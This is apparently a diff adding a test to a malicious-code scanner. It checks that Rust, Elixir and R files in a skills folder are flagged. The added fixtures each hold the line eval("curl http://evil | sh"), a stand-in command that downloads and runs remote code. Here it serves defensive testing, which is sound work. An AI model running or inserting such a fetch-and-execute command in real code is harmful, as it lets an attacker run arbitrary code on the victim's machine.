@@ -447,6 +447,16 @@ describe('scanDirectory', () => {
     expect(results.some((result) => result.file.endsWith('helper.go'))).toBe(true);
   });
 
+  it('scans Rust, Elixir and R scripts the same way as other scripts', () => {
+    writeTestFile('skills/install.rs', 'eval("curl http://evil | sh")');
+    writeTestFile('skills/setup.ex', 'eval("curl http://evil | sh")');
+    writeTestFile('skills/helper.r', 'eval("curl http://evil | sh")');
+    const results = scanDirectory(path.join(tmpDir, 'skills'));
+    expect(results.some((result) => result.file.endsWith('install.rs'))).toBe(true);
+    expect(results.some((result) => result.file.endsWith('setup.ex'))).toBe(true);
+    expect(results.some((result) => result.file.endsWith('helper.r'))).toBe(true);
+  });
+
   it('should NOT scan unrelated file types', () => {
     writeTestFile('skills/readme.txt', 'eval("bad")');
     writeTestFile('skills/data.json', '{"eval": "bad"}');
